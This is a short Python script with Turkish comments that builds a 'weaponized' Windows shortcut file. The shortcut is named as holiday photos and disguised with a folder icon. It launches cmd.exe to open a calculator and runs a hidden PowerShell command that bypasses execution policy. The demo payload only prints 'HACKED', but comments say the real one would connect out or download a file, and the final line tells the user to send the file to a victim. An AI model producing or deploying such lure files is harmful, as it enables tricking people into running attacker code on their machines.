import os
import win32com.client

print("--- WEAPONIZED LNK GENERATOR ---")

def create_shortcut(name, target_cmd):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(name)
    
    # CMD üzerinden hem zararsız bir şey yap hem zararlı kodu çalıştır
    # Örn: Hesap makinesini aç (Payload)
    shortcut.Targetpath = "cmd.exe"
    shortcut.Arguments = f"/c start calc.exe & {target_cmd}"
    shortcut.WindowStyle = 7 # Minimized (Gizli pencere)
    shortcut.IconLocation = "shell32.dll,3" # Klasör ikonu gibi görün
    shortcut.save()
    print(f"✅ {name} oluşturuldu.")

# Gerçek Payload (Örn: Bir siteye bağlan veya dosya indir)
payload = "powershell -NoP -W Hidden -Exec Bypass -C \"Write-Host 'HACKED'\""

create_shortcut("Tatil_Fotograflari.lnk", payload)
print("Bu dosyayı kurbana at. Klasör sanıp tıkladığında kod çalışacak.")